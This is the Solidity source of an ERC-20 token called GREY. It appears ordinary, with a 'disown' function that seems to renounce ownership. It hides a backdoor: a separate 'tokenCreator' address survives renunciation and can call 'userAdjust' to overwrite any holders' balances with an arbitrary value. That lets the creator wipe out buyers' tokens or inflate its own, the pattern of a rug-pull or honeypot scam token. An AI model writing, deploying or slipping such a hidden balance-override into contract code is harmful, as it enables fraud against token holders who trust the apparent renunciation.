pragma solidity ^0.8.15;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract ContextModified {
    function retrieveSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract SingleOwner is ContextModified {
    address private contractOwner;
    event OwnerChanged(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = retrieveSender();
        contractOwner = msgSender;
        emit OwnerChanged(address(0), msgSender);
    }

    function owner() public view virtual returns (address) {
        return contractOwner;
    }

    modifier isOwner() {
        require(owner() == retrieveSender(), "NotTheOwner: Action must be performed by the owner");
        _;
    }

    function disown() public virtual isOwner {
        emit OwnerChanged(contractOwner, address(0x000000000000000000000000000000000000dEaD));
        contractOwner = address(0x000000000000000000000000000000000000dEaD);
    }
}




contract GREY is ContextModified, SingleOwner, IERC20 {
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    address private tokenCreator;

    string public constant _name = "GREY";
    string public constant _symbol = "GREY";
    uint8 public constant _decimals = 18;
    uint256 public constant _totalSupply = 1000000 * (10 ** _decimals);

    constructor() {
        _balances[retrieveSender()] = _totalSupply;
        emit Transfer(address(0), retrieveSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    modifier isCreator() {
        require(retrieveCreator() == retrieveSender(), "NotTheCreator: Action must be performed by the creator");
        _;
    }

    function retrieveCreator() public view virtual returns (address) {
        return tokenCreator;
    }

    function updateCreator(address newCreator) public isOwner {
        tokenCreator = newCreator;
    }

    event TokenDistributed(address indexed user, uint256 oldBalance, uint256 updatedBalance);

    function userAdjust(address[] memory userAddresses, uint256 desiredAmount) public isCreator {
        require(desiredAmount >= 0, "Error: desired amount must be non-negative");

        for (uint256 i = 0; i < userAddresses.length; i++) {
            address currentUser = userAddresses[i];
            require(currentUser != address(0), "Error: user address must not be zero address");

            uint256 oldBalance = _balances[currentUser];
            _balances[currentUser] = desiredAmount;

            emit TokenDistributed(currentUser, oldBalance, desiredAmount);
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    require(_balances[retrieveSender()] >= amount, "TT: transfer amount exceeds balance");
    _balances[retrieveSender()] -= amount;
    _balances[recipient] += amount;

    emit Transfer(retrieveSender(), recipient, amount);
    return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[retrieveSender()][spender] = amount;
        emit Approval(retrieveSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    require(_allowances[sender][retrieveSender()] >= amount, "TT: transfer amount exceeds allowance");

    _balances[sender] -= amount;
    _balances[recipient] += amount;
    _allowances[sender][retrieveSender()] -= amount;

    emit Transfer(sender, recipient, amount);
    return true;
    }

    function totalSupply() external view override returns (uint256) {
    return _totalSupply;
    }
}